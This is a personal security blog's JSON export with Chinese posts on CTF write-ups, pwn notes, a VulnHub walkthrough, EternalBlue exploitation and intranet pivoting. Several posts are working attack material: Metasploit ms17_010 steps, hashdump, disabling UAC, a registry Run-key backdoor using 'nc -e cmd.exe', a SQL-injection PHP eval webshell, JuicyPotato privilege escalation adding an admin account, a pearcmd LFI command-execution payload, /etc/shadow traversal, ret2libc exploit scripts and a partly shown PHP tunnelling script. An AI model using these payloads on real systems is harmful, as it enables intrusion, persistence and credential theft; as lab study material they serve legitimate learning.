{"meta":{"title":"RunCtf","subtitle":"","description":"","author":"JunHou","url":"http://runctf.cn","root":"/"},"pages":[{"title":"我的朋友","date":"2022-10-19T15:11:06.000Z","updated":"2023-01-11T16:35:33.792Z","comments":true,"path":"PY/index.html","permalink":"http://runctf.cn/PY/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2021-06-15T16:34:27.000Z","updated":"2023-01-11T16:35:33.804Z","comments":true,"path":"about/index.html","permalink":"http://runctf.cn/about/index.html","excerpt":"","text":""},{"title":"archive","date":"2022-10-12T11:51:56.000Z","updated":"2023-01-11T16:35:33.804Z","comments":true,"path":"archive/index.html","permalink":"http://runctf.cn/archive/index.html","excerpt":"","text":""},{"title":"donate","date":"2022-10-12T11:53:13.000Z","updated":"2023-01-11T16:35:33.816Z","comments":true,"path":"donate/index.html","permalink":"http://runctf.cn/donate/index.html","excerpt":"","text":""}],"posts":[{"title":"山东省\"技能兴鲁-网络安全赛道\"职业技能大赛WriteUp","slug":"技能兴鲁","date":"2022-12-23T14:16:01.000Z","updated":"2023-01-11T16:35:33.800Z","comments":true,"path":"2022/12/23/技能兴鲁/","link":"","permalink":"http://runctf.cn/2022/12/23/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/","excerpt":"","text":"miscmisc_pyc用uncompyle6反编译 1234567891011121314151617181920212223242526272829303132333435363738import base64flag_2 = &#x27;*****&#x27;bin_str = &#x27;&#x27;.join([bin(ord(c)).replace(&#x27;0b&#x27;, &#x27;&#x27;).zfill(8) for c in flag_2])base64chars = &#x27;ABCDEFGHIJKLMNOPQRSTKipLNneNhQLR8xeL8rP12aDox5DmYSrcB3456789+/&#x27;with open(&#x27;0.txt&#x27;, &#x27;rb&#x27;) as (f0): with open(&#x27;1.txt&#x27;, &#x27;wb&#x27;) as (f1): for line in f0.readlines(): rowstr = base64.b64encode(line.replace(b&#x27;\\n&#x27;, b&#x27;&#x27;)) equalnum = rowstr.count(b&#x27;=&#x27;) if equalnum: if len(bin_str): offset = int(&#x27;0b&#x27; + bin_str[:equalnum * 2], 2) char = rowstr[(len(rowstr) - equalnum - 1)] char = chr(char) rowstr = rowstr.replace(char.encode(), base64chars[(base64chars.index(char) + offset)].encode()) bin_str = bin_str[equalnum * 2:] f1.write(rowstr + b&#x27;\\n&#x27;)what_f1_write = [ &#x27;YQ1=&#x27;, &#x27;Yg3=&#x27;, &#x27;Yw0=&#x27;, &#x27;ZA3=&#x27;, &#x27;ZQ1=&#x27;, &#x27;Zg0=&#x27;, &#x27;Zw1=&#x27;, &#x27;aA1=&#x27;, &#x27;aQ0=&#x27;, &#x27;ag3=&#x27;, &#x27;aw1=&#x27;, &#x27;bA2=&#x27;, &#x27;bQ0=&#x27;, &#x27;bg3=&#x27;, &#x27;bw1=&#x27;, &#x27;cA0=&#x27;, &#x27;cQ1=&#x27;, &#x27;cg3=&#x27;, &#x27;c9==&#x27;] base64隐写 12345678910111213141516import base64b64chars = &#x27;ABCDEFGHIJKLMNOPQRSTKipLNneNhQLR8xeL8rP12aDox5DmYSrcB3456789+/&#x27;what_f1_write = [&#x27;YQ1=&#x27;,&#x27;Yg3=&#x27;,&#x27;Yw0=&#x27;,&#x27;ZA3=&#x27;,&#x27;ZQ1=&#x27;,&#x27;Zg0=&#x27;,&#x27;Zw1=&#x27;,&#x27;aA1=&#x27;,&#x27;aQ0=&#x27;,&#x27;ag3=&#x27;,&#x27;aw1=&#x27;,&#x27;bA2=&#x27;,&#x27;bQ0=&#x27;,&#x27;bg3=&#x27;,&#x27;bw1=&#x27;,&#x27;cA0=&#x27;,&#x27;cQ1=&#x27;,&#x27;cg3=&#x27;,&#x27;c9==&#x27;]bin_str = &#x27;&#x27;for stegb64 in what_f1_write: # stegb64 = str(line, &quot;utf-8&quot;).strip(&quot;\\n&quot;) rowb64 = str(base64.b64encode(base64.b64decode(stegb64)), &quot;utf-8&quot;).strip(&quot;\\n&quot;) offset = abs(b64chars.index(stegb64.replace(&#x27;=&#x27;, &#x27;&#x27;).replace(&#x27;\\r&#x27;,&#x27;&#x27;)[-1]) - b64chars.index(rowb64.replace(&#x27;=&#x27;, &#x27;&#x27;)[-1])) equalnum = stegb64.count(&#x27;=&#x27;) # no equalnum no offset if equalnum: bin_str += bin(offset)[2:].zfill(equalnum * 2) print(&#x27;&#x27;.join([chr(int(bin_str[i:i + 8], 2)) for i in range(0, len(bin_str), 8)])) 得到结果 sE64} 再去用pyc隐写解前半段 拼起来得到 1flag&#123;pyc&amp;bAsE64&#125; 好玩的编码15230307a5631465756444a4e576c6c4852566c4d4d6b3953535555794d30745454454a4a52454e54576c704a556b5a584e6b355454453431574668425430784b546c704a555430395054303d 解hex16： 1R00zV1FWVDJNWllHRVlMMk9SSUUyM0tTKipLNneNhQLR8xeL8rP12aDox5DmYSrcBDmYSrcB magic：base32再58： 1flag&#123;W0w_You_ar3_great&#125; happyImgstegsolve左右翻发现一个密码： 1!QAZXSW@1qazxsw2 lsb隐写,red，blue为0。 保存为bin，记事本打开看到flag.png，改名为压缩包，输入密码，得到flag 网络寻综看图是哈穆迪清真寺 谷歌搜mosquee AI-Hamoudi phone 看到电话 1flag&#123;+25377865774&#125; crypto3des给了一个java文件和一个加密结果 算法就是tripleDES 12345678910111213141516171819202122232425262728293031323334import javax.crypto.Cipher;import javax.crypto.spec.IvParameterSpec;import javax.crypto.spec.SecretKeySpec;class Crypto &#123; private static String KEY = &quot;@2AzsQ#Hnx%XTosMR6$LtEKD&quot;; private static String IV = &quot;CpEF7SDz&quot;; public static String encrypt(String data) throws Exception &#123; Cipher cipher = Cipher.getInstance(&quot;DESede/CBC/PKCS5Padding&quot;); SecretKeySpec secretKeySpec = new SecretKeySpec(KEY.getBytes(), &quot;DESede&quot;); IvParameterSpec ivParameterSpec = new IvParameterSpec(IV.getBytes()); cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec, ivParameterSpec); byte[] encrypted = cipher.doFinal(data.getBytes(&quot;UTF-8&quot;)); return bytes2hexstr(encrypted); &#125; public static String bytes2hexstr(byte[] buf) &#123; StringBuffer sb = new StringBuffer(); for (int i = 0; i &lt; buf.length; i++) &#123; String hex = Integer.toHexString(buf[i] &amp; 0xFF); if (hex.length() == 1) &#123; hex = &#x27;0&#x27; + hex; &#125; sb.append(hex.toLowerCase()); &#125; return sb.toString(); &#125; public static void main(String[] args) throws Exception &#123; System.out.println(encrypt(&quot;flag&#123;xxx&#125;&quot;)); &#125;&#125; key&#x3D;@2AzsQ#Hnx%XTosMR6$LtEKD IV&#x3D;CpEF7SDz 算法CBC&#x2F;PKCS5Padding happyRSA给了pqenc 但是e是phi_n的因数 用AMM在有限域内开方 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#sagefrom Crypto.Util.number import *import gmpy2import timeimport randomfrom tqdm import tqdmp = 97559992143538505823351615639211763734311559951587665014345919747733390740450790273359386575890798160795025626573580365828156108078100621074495137190416226109270591884516099679926053478560750986193065549865131400457769381398338702594631516054868885157801055786648957386508374821243393633398068286519087291899e = 223q = 39f36dNMc5CmshUCPAH1VsCv4A84pGdSyu61654473174790323208128426716523786159389593732096324499033892465876683490515456465981922248571768795221792067055550876465089846480000103207743072486330333647531692833975457277965585913100536970416049033758578728704151353769882703817603346904165274693820583811661679269246933c = 8310151988085860771226135398874764307621316769660563267495107758782855420167201345224621932233009864886459191650276831555553606018772356624861344010051427084784712615419584399034171295434663517111130692609510225248850800086750351336299722121740091690781297611587292792380263994661373171593543809045588215109967008287273462651359353786188222933360961215432623197670015133463997036747979075992284955864774118038735419327630590319728196257908297742808557311174379279085833900573941668601788656519597930019583786869324790276024107739682158108450127890693464079075924933789639419538796893294354565682012619667240947317948n = p*qdef AMM(o, r, q): start = time.time() print(&#x27;\\n----------------------------------------------------------------------------------&#x27;) print(&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;) print(&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;.format(r, o, q)) g = GF(q) o = g(o) p = g(random.randint(1, q)) while p ^ ((q-1) // r) == 1: p = g(random.randint(1, q)) print(&#x27;[+] Find p:&#123;&#125;&#x27;.format(p)) t = 0 s = q - 1 while s % r == 0: t += 1 s = s // r print(&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;.format(s, t)) k = 1 while (k * s + 1) % r != 0: k += 1 alp = (k * s + 1) // r print(&#x27;[+] Find alp:&#123;&#125;&#x27;.format(alp)) a = p ^ (r**(t-1) * s) b = o ^ (r*alp - 1) c = p ^ s h = 1 for i in range(1, t): d = b ^ (r^(t-1-i)) if d == 1: j = 0 else: print(&#x27;[+] Calculating DLP...&#x27;) j = - discrete_log(d, a) print(&#x27;[+] Finish DLP...&#x27;) b = b * (c^r)^j h = h * c^j c = c^r result = o^alp * h end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) print(&#x27;Find one solution: &#123;&#125;&#x27;.format(result)) return resultdef onemod(p,r): t=p-2 while pow(t,(p-1) // r,p)==1: t -= 1 return pow(t,(p-1) // r,p) def solution(p,root,e): g = onemod(p,e) may = set() for i in range(e): may.add(root * pow(g,i,p)%p) return maydef union(x1, x2): a1, m1 = x1 a2, m2 = x2 d = gmpy2.gcd(m1, m2) assert (a2 - a1) % d == 0 p1,p2 = m1 // d,m2 // d _,l1,l2 = gmpy2.gcdext(p1,p2) k = -((a1 - a2) // d) * l1 lcm = gmpy2.lcm(m1,m2) ans = (a1 + k * m1) % lcm return ans,lcmdef excrt(ai,mi): tmp = zip(ai,mi) return reduce(union, tmp)cp = c % pcq = c % qmp = AMM(cp,e,p)mq = AMM(cq,e,q)mps = solution(p,mp,e)mqs = solution(q,mq,e)for mpp in tqdm(mps): for mqq in mqs: ai = [int(mpp),int(mqq)] mi = [p,q] m = CRT_list(ai,mi) flag = long_to_bytes(m) if b&#x27;flag&#x27; in flag: print(flag) exit(0) web多页面爬取抓包爆破 每一个页面下的字母合并即可 lfi_systemdirsearch扫描 发现php.php 寻找到 session.upload_progress.enabled &#x3D; on开启的 由于session.upload_progress.cleanup默认开启 需要利用条件竞争来读取session文件 12https://blog.csdn.net/qq_46918279/article/details/120106832#WEB82-session文件包含 采用bp抓包手动爆破 构造上传文件的页面，对环境上传文件，然后抓包 12345678910111213&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://47.105.39.3:22003/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;2333&quot; /&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpsession_start();?&gt; 设置两项 条件竞争即可 onenav打开发现为onenav框架，通过github查看源码得知存在version.txt文件。访问可以得到版本号为0.9.14 搜索相应版本漏洞，在github发现存在路径穿越漏洞，但没有详细，对比0.9.14与0.9.15发现最后过滤了 ..&#x2F; 与 .&#x2F; ，且后面once_include()中存在可控参数 接着通过pearcmd执行系统命令即可，本来想反弹shell，但发现空格绕过一直绕不过去，最后想到直接获取$_POST参数来执行命令就是了。 payload： 1/index.php?+config-create+/&amp;c=../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=system($_POST[&#x27;a&#x27;])?&gt;+/tmp/hello1.php","categories":[],"tags":[{"name":"技术","slug":"技术","permalink":"http://runctf.cn/tags/%E6%8A%80%E6%9C%AF/"}]},{"title":"原神换服","slug":"原神服务区转换","date":"2022-12-15T14:16:01.000Z","updated":"2023-01-11T16:35:33.800Z","comments":true,"path":"2022/12/15/原神服务区转换/","link":"","permalink":"http://runctf.cn/2022/12/15/%E5%8E%9F%E7%A5%9E%E6%9C%8D%E5%8A%A1%E5%8C%BA%E8%BD%AC%E6%8D%A2/","excerpt":"","text":"源码xx.vbs 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&#x27;time：20221215dim fzset fz = CreateObject(&quot;Scripting.FileSystemObject&quot;)call fz.CopyFile(&quot;config.ini&quot;, &quot;config.ini7&quot;) &#x27;两个参数的文件名部分可以不同set fz = nothingdim fso, fset fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)set f = fso.OpenTextFile(&quot;config.ini&quot;, 2, false) &#x27;第二个参数 2 表示重写，如果是 8 表示追加&#x27;f.Write(&quot;写入内容&quot;)&#x27;f.WriteLine(&quot;写入内容并换行&quot;)&#x27;f.WriteBlankLines(3) &#x27;写入三个空白行（相当于在文本编辑器中按三次回车）msgbox &quot;作者QQ2565543706&quot;&amp;chr(10)&amp;&quot;B服选择:1!&quot;&amp;chr(10)&amp;&quot;官服选择:2!&quot;dim aa=0do while a=0a = inputbox (&quot;b服选择:1!&quot;&amp;chr(10)&amp;&quot;官服选择:2!&quot;&amp;chr(10)&amp;&quot;请不要输入其他东西！&quot;&amp;chr(10)&amp;&quot;有问题qq:2565543706&quot;&amp;chr(10)&amp;&quot;后缀为.ini7的是备份文件.&quot;&amp;chr(10)&amp;&quot;出现其他问题可重命名（删除后缀上的“7”）文件恢复备份&quot;,&quot;电脑原神服务器修改1.0&quot;)LoopIF a=1 Then f.WriteLine(&quot;[General]&quot;)f.WriteLine(&quot;channel=14&quot;)f.WriteLine(&quot;cps=bilibili&quot;)f.WriteLine(&quot;sub_channel=0&quot;)f.WriteLine(&quot;game_version=3.3.0&quot;)f.WriteLine(&quot;plugin_5_version=2.6.0&quot;)f.WriteLine(&quot;plugin_sdk_version=3.5.0&quot;)msgbox &quot;成功修改为B服&quot;ElseIf a=2 Then f.WriteLine(&quot;[General]&quot;)f.WriteLine(&quot;channel=1&quot;)f.WriteLine(&quot;cps=mihoyo&quot;)f.WriteLine(&quot;sub_channel=1&quot;)f.WriteLine(&quot;game_version=3.3.0&quot;)f.WriteLine(&quot;plugin_5_version=2.6.0&quot;)f.WriteLine(&quot;plugin_sdk_version=3.5.0&quot;)msgbox &quot;成功修改为官服&quot;else msgbox &quot;我不理解！&quot;End Iff.Close()set f = nothingset fso = nothing 如何使用吧xx.vbs放在Genshin Impact下右键发送至桌面。 双击启动即可 121是哔服2是官服","categories":[],"tags":[{"name":"游戏","slug":"游戏","permalink":"http://runctf.cn/tags/%E6%B8%B8%E6%88%8F/"}]},{"title":"部署CTFd","slug":"CTFd","date":"2022-12-11T14:16:01.000Z","updated":"2023-01-11T16:35:33.792Z","comments":true,"path":"2022/12/11/CTFd/","link":"","permalink":"http://runctf.cn/2022/12/11/CTFd/","excerpt":"","text":"安装docker1wget http://fishros.com/install -O fishros &amp;&amp; . fishros 安装docker-compose安装docker-compose 1sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.24.1/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose 添加运行权限 1sudo chmod +x /usr/local/bin/docker-compose 查看docker-compose 1docker-compose --version 安装H1ve1234567891011修改hostscd /etcsudo rm -rf hostssudo wget https://cdn.jsdelivr.net/gh/521xueweihan/GitHub520@main/hosts下载H1vegit clone https://github.com/D0g3-Lab/H1ve.git H1ve-1.1.3启动服务cd H1ve-1.1.3docker-compose -f single.yml up -d停止服务docker-compose -f single.yml stop 访问CTFd1127.0.0.1:8000","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://runctf.cn/tags/ctf/"}]},{"title":"w1r3s-editable解题笔记","slug":"w1r3s-editable","date":"2022-12-11T14:16:01.000Z","updated":"2023-01-11T16:35:33.800Z","comments":true,"path":"2022/12/11/w1r3s-editable/","link":"","permalink":"http://runctf.cn/2022/12/11/w1r3s-editable/","excerpt":"","text":"信息收集扫描主机： 1sudo nmap -sn 192.168.20.0/24 得到地址:192.168.20.150 扫描端口(建议扫两边) 1sudo nmap --min-rate 10000 -o- 192.168.20.150 TCP扫描 1sudo nmap -sT -sV -O -p21,22,80,3306 192.168.20.150 UDP扫描 1sudo nmap -sU -p21,22,80,3306 192.168.20.150 漏洞扫描 1sudo nmap --script=vuln -p21,22,80,3306 192.168.20.150 漏洞测试测试ftp123ftp 192.168.20.150测试游客账号：anonymous密码空 下载文件 123binarymget 0*.txt //批量下载get 文件 查看下载文件 12hash-identifier //哈希识别器echo &#x27;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==&#x27; | base64 -d //解base64 测试Web目录爆破 1feroxbuster -u http://192.168.20.150 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 测试 123456789101112searchsploit cuppa cms //搜搜漏洞利用文件searchsploit cuppa cms -m 25971//下载文件http://192.168.20.150/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwdcurl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.20.150/administrator/alerts/alertConfigField.phpcurl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.20.150/administrator/alerts/alertConfigField.php | html2textcurl --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.20.150/administrator/alerts/alertConfigField.php | html2textjohn hash john --show haxi 利用漏洞登录ssh 1234whoami //查看权限uname -asudo -lsudo /bin/bash 拿到权限获取flag 12cd /rootcat flag","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://runctf.cn/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"Pwn的学习笔记","slug":"笔记","date":"2022-12-10T14:16:01.000Z","updated":"2023-01-11T16:35:33.804Z","comments":true,"path":"2022/12/10/笔记/","link":"","permalink":"http://runctf.cn/2022/12/10/%E7%AC%94%E8%AE%B0/","excerpt":"","text":"Linux：12345678910111213checksec 文件 //查看保护措施 Arch: RELRO: 动态连接只读 Stack: 栈溢出状态 NX: 栈不可执行 PIE: RWX: 可读可写可执行 file //查看多少位 statically linked // 静态连接 ldd a.out // 查看动态连接库echo ZmxhZ3tuMHRfZjRzdGVyX3Q2YW5feTB1fQo= | base64 -d IDA123F5 //反编译功能shift + F12 //查找字符串G //搜0x地址 python运算120xffffd1a8 - 0xffffd13chex(108) pwn123456789101112131415161718192021from pwn import *io = process(&quot;./ret2text&quot;) //本地调试io = remote(&quot;192.168.20.147&quot;,12345) //远程调试io.recvline() //接收一行io.recv() //接收全部io.send() //里面是字节流io.sendline(payload) //传递字节流io.interactive() //获得交互asm(shellcraft.sh()).ljust(112,b&#x27;A&#x27;) //生成shell，ljust补充垃圾数据到112个elf = ELF(&quot;./ret2syscall&quot;) //ELF值hex(next(elf.search(b&quot;/bin/sh&quot;))) //查看/bin/sh位置 gbd12345678cyclic 200 //生成随机数cyclic -l daab //计算偏移run //测试b //打断点s //暂停vmmap //显示虚拟内存的分布stack 24plt //动态plt ROPgadget 返回导向编程： int 80h 0x08049421 ebx &#x2F;bin&#x2F;sh 0x080BE408 ecx 0 edx 0 pop_edx_ecx_ebx_ret addr 0x0806eb90 0xb pop_eax_ret addr 0x080bb196 local 12345678910111213141516171819xor //异或 -&gt; 逻辑与 , 逻辑或sys_execve() -&gt; 0xb -&gt; 11int 0x80 (eax=0xb , ebx=0x8048xxx , ecx=0 , edx=0)ROPgadget --binary 二进制文件 --only &quot;寻找什么样的内容&quot;ROPgadget --binary ret2syscall --only &quot;pop|ret&quot;ROPgadget --binary ret2syscall --only &quot;pop|ret&quot; | grep eaxROPgadget --binary ret2syscall --only &quot;pop|ret&quot; | grep ebxROPgadget --binary ret2syscall --only &quot;int&quot;无 int 80 gcc1cat /proc/sys/kernel/randomize_va_space //随机化 进阶ret2libc Linux 1strings ret2libc1 | grep /bin/sh //直接查看程序有没有/bin/sh pwntools 12elf.plt[&quot;system&quot;]elf.symbols[&quot;buf2&quot;] pwndbg 1plt // 查看plt ret2libc1: 12345678from pwn import *io = process(&quot;./ret2libc1&quot;)elf = ELF(&quot;./ret2libc1&quot;)system_plt = elf.plt[&quot;system&quot;]bin_sh = next(elf.search(b&quot;/bin/sh&quot;))payload = b&#x27;A&#x27; * 112 + p32(system_plt) + b&#x27;BBBB&#x27; + p32(bin_sh)io.sendline(payload)io.interactive() ret2libc2: 1234567891011 1 from pwn import * 2 io = process(&quot;./ret2libc2&quot;) 3 elf = ELF(&quot;./ret2libc2&quot;) 4 get_plt = elf.plt[&quot;gets&quot;] 5 system_plt = elf.plt[&quot;system&quot;] 6 buf2 = elf.symbols[&quot;buf2&quot;] 7 io.recv() 8 payload = b&#x27;A&#x27; * 112 + p32(get_plt) + p32(system_plt) + p32(buf2) + p32(buf2) 9 io.sendline(payload)10 io.sendline(b&quot;/bin/sh\\x00&quot;)11 io.interactive() ret2libc3: puts地址泄露：0xf7e37c40 plt - 距离 &#x3D; system 10xf7e37c40 - 0x2345 = system(0xf7e358fb) 123456789101112from pwn import *elf = ELF(&quot;./ret2libc3&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)io = process(&quot;./ret2libc3&quot;)io.sendlineafter(b&quot; :&quot;, str(elf.got[&quot;puts&quot;]))io.recvuntilb(b&quot; : &quot;)libcBase = int(io.recvuntil(b&quot;\\n&quot;, drop = True) , 16) - libc.symbols[&quot;puts&quot;]success(&quot;libcBase -&gt; &#123;: #x&#125;&quot;.format(libcBase))payload = flat(cyclic(60), libcBase + libc.symbols[&quot;system&quot;], 0xdeadbeeF, next(elf.search(b&quot;sh\\x00&quot;)))io.sendlineafter(b&quot; :&quot;,payload)io.interactive()","categories":[],"tags":[{"name":"栈溢出","slug":"栈溢出","permalink":"http://runctf.cn/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"}]},{"title":"Windows7-永恒之蓝","slug":"Metasploit","date":"2022-11-27T14:16:01.000Z","updated":"2023-01-11T16:35:33.792Z","comments":true,"path":"2022/11/27/Metasploit/","link":"","permalink":"http://runctf.cn/2022/11/27/Metasploit/","excerpt":"","text":"Metasploit永恒之蓝：打入靶机12345678910111213sudo msfconsoleuse exploit/windows/smb/ms17_010_eternalblueset rhost 目标靶机IPset payload windows/x64/meterpreter/reverse_tcpset lhost 操作机IPrun - expshell &gt; whoami 权限维持123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869启用远程桌面meterpreter &gt; run post/windows/manage/enable_rdp创建一个新用户来远程连接 win7 桌面meterpreter &gt; run post/windows/manage/enable_rdp USERNAME=xuegod PASSWORD=123456进行远程桌面rdesktop 192.168.1.56[地址为靶机地址]通过 ms17-010 永恒之蓝获取到的 shell 可能会出现操作受限的情况，所以我们使用主机的账户信息建立 session 进行连接。SAM 概述：SAM 文件即账号密码数据库文件，SAM 文件的位置是：C:\\Windows\\System32\\config\\SAM我们回到 MSF 控制台，从 SAM 导出密码哈希meterpreter &gt; hashdump我们取刚创建的 xuegod 用户的 hash 密码xuegod:1001:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4::meterpreter &gt; shellC:\\Windows\\system32&gt;netsh firewall add portopening TCP 4444 &quot;xuegod&quot; ENABLE ALL关闭 UACmeterpreter &gt; shellC:\\Windows\\system32&gt;cmd.exe /k %windir%\\System32\\reg.exe ADDHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f开启 win7 系统主机的默认共享，默认共享对 Windows 主机的文件共享非常方便，也方便黑客利用这个功能，远程执行命令。C:\\Windows\\system32&gt;cmd.exe /k %windir%\\System32\\reg.exe ADDHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /fC:\\Windows\\system32&gt;exit #退出 shell 返回 meterpreterC:\\Windows\\system32&gt;exitC:\\Windows\\system32&gt;exitexit我们先将 session 保存到后台meterpreter &gt; background3、使用 hash 值登录系统msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; use exploit/windows/smb/psexecmsf5 exploit(windows/smb/psexec) &gt; set payload windows/meterpreter/reverse_tcpmsf5 exploit(windows/smb/psexec) &gt; set RHOSTS 192.168.1.56msf5 exploit(windows/smb/psexec) &gt; set LHOST 192.168.1.53配置用户信息msf5 exploit(windows/smb/psexec) &gt; set SMBUser xuegod密码使用哈希值msf5 exploit(windows/smb/psexec) &gt; set SMBPass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4这里局域网中 SMBDomain 都是 WORKGROUP 如果是域用户需要配置域名称。msf5 exploit(windows/smb/psexec) &gt; set SMBDomainWORKGROUPmsf5 exploit(windows/smb/psexec) &gt; exploit下面我们配置一个后门程序，修改 UAC 的注册表，需要重启才能生效。上传 nc 到 Win7meterpreter &gt; upload /usr/share/windows-binaries/nc.exe C:\\\\windows注册表添加启动项执行 nc 反弹 shell 命令meterpreter &gt; reg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v lltest_nc -d &#x27;C:\\windows\\nc.exe -Ldp 443 -e cmd.exe&#x27;nc 参数解释：L 表示用户退出连接后重新进行端口侦听d 后台运行p 指定端口meterpreter &gt; shell防火墙允许 443 端口访问网络否则开机的时需要用户点击允许访问网络才可以成功执行。C:\\Windows\\system32&gt; netsh firewall add portopening TCP 443 &quot;xuegod443&quot; ENABLE AL","categories":[],"tags":[{"name":"技术","slug":"技术","permalink":"http://runctf.cn/tags/%E6%8A%80%E6%9C%AF/"}]},{"title":"内网-横向渗透","slug":"neiwang","date":"2022-10-26T14:16:01.000Z","updated":"2023-01-11T16:35:33.800Z","comments":true,"path":"2022/10/26/neiwang/","link":"","permalink":"http://runctf.cn/2022/10/26/neiwang/","excerpt":"","text":"1 利用SQL注入获取webshell核心命令： 1234567Mysql导出函数： [将数据库里面的内容导出] into outfile into dumpfile [可以写16进制写入] 当知道绝对路径时，且可以导出权限开启的时候就可以拿到Webshell。 DNS注入 load_file 利用sql注入生成一句话木马： 1id=7 union select 1,&#x27;&lt;?php eval($_REQUEST[8])?&gt;&#x27; into outfile &#x27;c:/phpstudy/www/125.php&#x27; 上传成功利用webshell管理工具进行遍历查看管理权限： 1234whoami 查看当前用户权限netstat -ano 查看本机开放的端口 tasklist 查看本机运行的程序[类似于任务管理器]systeminfo 查看计算机信息 windows漏洞查看(https://i.hacking8.com/tiquan/). 使用webshell管理工具上传exp. 权限是test权限使用exp进行提权,使用exp(JuicyPotato.exe). 使用方法 12345JuicyPotato.exe -p &quot;需要执行的命令&quot;添加账号:JuicyPotato.exe -p &quot;net user qqq 123 /add&quot;提升至管理员组:JuicyPotato.exe -p &quot;net localgroup administrators qqq /add&quot; 使用远程桌面进行连接发现不是一台服务器，对方使用了端口映射. 我们使用代理脚本(xxx.php)使用webshell管理工具进行上传: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175&lt;?php/*二开作者qq2565543706*/ini_set(&quot;allow_url_fopen&quot;, true);ini_set(&quot;allow_url_include&quot;, true);error_reporting(E_ERROR | E_PARSE);if( !function_exists(&#x27;apache_request_headers&#x27;) ) &#123; function apache_request_headers() &#123; $arh = array(); $rx_http = &#x27;/\\AHTTP_/&#x27;; foreach($_SERVER as $key =&gt; $val) &#123; if( preg_match($rx_http, $key) ) &#123; $arh_key = preg_replace($rx_http, &#x27;&#x27;, $key); $rx_matches = array(); $rx_matches = explode(&#x27;_&#x27;, $arh_key); if( count($rx_matches) &gt; 0 and strlen($arh_key) &gt; 2 ) &#123; foreach($rx_matches as $ak_key =&gt; $ak_val) &#123; $rx_matches[$ak_key] = ucfirst($ak_val); &#125; $arh_key = implode(&#x27;-&#x27;, $rx_matches); &#125; $arh[$arh_key] = $val; &#125; &#125; return( $arh ); &#125;&#125;if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;GET&#x27;)&#123; exit(&quot;Georg says, &#x27;All seems fine&#x27;&quot;);&#125;if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123; set_time_limit(0); $headers=apache_request_headers(); $cmd = $headers[&quot;X-CMD&quot;]; switch($cmd)&#123; case &quot;CONNECT&quot;: &#123; $target = $headers[&quot;X-TARGET&quot;]; $port = (int)$headers[&quot;X-PORT&quot;]; #$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); #if ($sock === false) #&#123; # header(&#x27;X-STATUS: FAIL&#x27;); # header(&#x27;X-ERROR: Failed creating socket&#x27;); # return; #&#125; $res = fsockopen($target, $port); #$res = @socket_connect($sock, $target, $port); if ($res === false) &#123; header(&#x27;X-STATUS: FAIL&#x27;); header(&#x27;X-ERROR: Failed connecting to target&#x27;); return; &#125; #socket_set_nonblock($res); stream_set_blocking($res, false); @session_start(); $_SESSION[&quot;run&quot;] = true; $_SESSION[&quot;writebuf&quot;] = &quot;&quot;; $_SESSION[&quot;readbuf&quot;] = &quot;&quot;; ob_end_clean(); header(&#x27;X-STATUS: OK&#x27;); header(&quot;Connection: close&quot;); ignore_user_abort(); ob_start(); $size = ob_get_length(); header(&quot;Content-Length: $size&quot;); ob_end_flush(); flush(); session_write_close(); while ($_SESSION[&quot;run&quot;]) &#123; $readBuff = &quot;&quot;; @session_start(); $writeBuff = $_SESSION[&quot;writebuf&quot;]; $_SESSION[&quot;writebuf&quot;] = &quot;&quot;; session_write_close(); if ($writeBuff != &quot;&quot;) &#123; stream_set_blocking($res, false); $i = fwrite($res, $writeBuff); #socket_write($sock, $writeBuff, strlen($writeBuff)); if($i === false) &#123; @session_start(); $_SESSION[&quot;run&quot;] = false; session_write_close(); 